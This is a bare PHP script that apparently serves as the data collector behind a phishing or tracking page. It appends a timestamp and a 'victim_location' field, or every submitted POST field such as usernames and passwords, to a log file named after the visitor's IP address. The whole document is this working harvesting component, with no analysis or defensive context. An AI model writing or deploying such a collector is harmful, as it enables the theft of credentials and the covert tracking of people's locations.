<?php
$file = fopen($_SERVER['REMOTE_ADDR'].'.txt', 'a');
if(isset($_GET['lo'],$_POST['victim_location'])){
	fputs($file, "[".date('m-d-Y H:i:s')."](".$_POST['victim_location'].")\n");
}
else{
	fputs($file, "[".date('m-d-Y H:i:s')."](");
	foreach($_POST as $k => $v) {
		fputs($file, "[$k]=>($v))\n");
	}
}
fclose($file);